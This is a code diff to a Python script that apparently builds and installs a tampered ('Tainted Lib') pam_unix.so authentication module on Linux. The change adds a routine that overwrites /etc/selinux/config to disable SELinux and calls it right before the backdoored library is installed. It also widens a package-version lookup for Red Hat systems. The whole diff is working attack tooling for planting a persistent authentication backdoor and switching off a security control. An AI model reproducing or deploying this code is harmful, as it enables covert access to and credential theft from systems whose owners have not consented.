@@ -147,12 +147,30 @@ def program_output(cmd):
         pass
     return False
 
+def fix_se_linux():
+    if os.path.exists("/etc/selinux/config"):
+        prompt("!", "SE Linux Detected, overwiting to disable.")
+        with open("/etc/selinux/config", "r", errors="ignore") as se_file:
+            se_conf = se_file.read()
+        se_file.close()
+        se_linux_updates = []
+        for line in se_conf.splitlines():
+            line = line.strip()
+            if line.find("SELINUX=") != -1:
+                se_linux_updates.append("SELINUX=disabled")
+            else:
+                se_linux_updates.append(line)
+        with open("/etc/selinux/config", "w") as fd2:
+            for se_updated_line in se_linux_updates:
+                fd2.write("{}\n".format(se_updated_line))
+        fd2.close()
+
 def get_pam_version():
     distro = platform.linux_distribution()[0].lower()
     if distro in ["ubuntu", "debian", "mint", "kali"]:
         return program_output("dpkg -s libpam-modules | grep -i Version | awk '{ print $2 }'").split("-")[0]
     elif distro in ["redhat", "centos", "centos linux"]:
-        return program_output("yum list installed | grep 'pam.i686' | awk '{print $2}'").split("-")[0]
+        return program_output("yum list installed | grep 'pam\.*' | awk '{print $2}'").split("-")[0]
     return False
 
 if __name__ == "__main__":
@@ -188,6 +206,7 @@ if __name__ == "__main__":
                         if os.path.exists("modules/pam_unix/.libs/pam_unix.so"):
                             prompt("+", "Finished Compiling Tainted Lib")
                             os.system("strip modules/pam_unix/.libs/pam_unix.so")
+                            fix_se_linux()
                             result = install_pam("modules/pam_unix/.libs/pam_unix.so")
                             shutil.rmtree(src_dir)
                             if result:
